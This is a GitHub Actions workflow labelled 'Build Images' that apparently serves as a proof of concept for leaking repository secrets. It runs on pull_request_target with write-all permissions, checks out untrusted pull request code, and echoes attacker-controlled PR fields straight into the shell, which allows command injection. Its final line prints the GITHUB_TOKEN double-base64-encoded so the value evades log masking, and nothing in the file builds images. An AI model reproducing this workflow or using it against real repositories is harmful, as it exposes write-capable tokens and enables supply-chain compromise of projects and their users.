name: "Build Images"
on: 
  pull_request_target:

permissions: write-all

jobs:
  init:
    runs-on: ubuntu-latest
    name: "init"
    steps:
    - run: |
        
        git fetch --depth=1 origin +refs/pull/${{ github.event.number }}/merge:refs/remotes/pull/${{ github.event.number }}/merge || git fetch --depth=1 origin +refs/pull/${{ github.event.number }}/head:refs/remotes/pull/${{ github.event.number }}/head
        git checkout pull/${{ github.event.number }}/merge || git checkout pull/${{ github.event.number }}/head

        cat test_push.md

        echo "[+] github.event.pull_request.head.sha"
        echo ${{ github.event.pull_request.head.sha }}

        echo "[+] github.event.pull_request.head.ref"
        echo ${{ github.event.pull_request.head.ref }}

        echo "[+] github.event_name"
        echo ${{ github.event_name }}

        echo "[+] github.event.pull_request.head.repo.full_name"
        echo ${{ github.event.pull_request.head.repo.full_name }}

        echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w0 | base64 -w0
